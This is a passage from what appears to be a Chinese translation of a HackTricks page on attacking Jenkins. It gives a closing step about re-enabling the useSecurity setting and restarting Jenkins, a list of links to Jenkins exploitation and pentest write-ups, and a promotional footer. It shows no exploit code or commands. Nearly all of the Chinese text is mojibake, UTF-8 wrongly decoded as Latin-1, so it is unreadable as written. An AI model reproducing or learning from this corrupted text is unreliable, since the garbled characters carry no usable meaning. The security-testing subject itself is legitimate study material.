6. é€šè¿‡å°†è®¾ç½®æ›´æ”¹ä¸º`<useSecurity>true</useSecurity>`ï¼Œ**é‡æ–°å¯ç”¨å®‰å…¨æ€§**ï¼Œç„¶å**å†æ¬¡é‡å¯Jenkins**ã€‚

## å‚è€ƒèµ„æ–™

* [https://github.com/gquere/pwn\_jenkins](https://github.com/gquere/pwn\_jenkins)
* [https://leonjza.github.io/blog/2015/05/27/jenkins-to-meterpreter---toying-with-powersploit/](https://leonjza.github.io/blog/2015/05/27/jenkins-to-meterpreter---toying-with-powersploit/)
* [https://www.pentestgeek.com/penetration-testing/hacking-jenkins-servers-with-no-password](https://www.pentestgeek.com/penetration-testing/hacking-jenkins-servers-with-no-password)
* [https://www.lazysystemadmin.com/2018/12/quick-howto-reset-jenkins-admin-password.html](https://www.lazysystemadmin.com/2018/12/quick-howto-reset-jenkins-admin-password.html)
* [https://medium.com/cider-sec/exploiting-jenkins-build-authorization-22bf72926072](https://medium.com/cider-sec/exploiting-jenkins-build-authorization-22bf72926072)
* [https://medium.com/@Proclus/tryhackme-internal-walk-through-90ec901926d3](https://medium.com/@Proclus/tryhackme-internal-walk-through-90ec901926d3)

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³åœ¨HackTricksä¸­çœ‹åˆ°æ‚¨çš„**å…¬å¸å¹¿å‘Š**æˆ–**ä¸‹è½½PDFç‰ˆæœ¬çš„HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* è·å–[**å®˜æ–¹PEASS & HackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* æ¢ç´¢[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤**](https://t.me/peass) æˆ–åœ¨**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ä¸Šå…³æ³¨æˆ‘ä»¬**ã€‚
* é€šè¿‡å‘[**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>
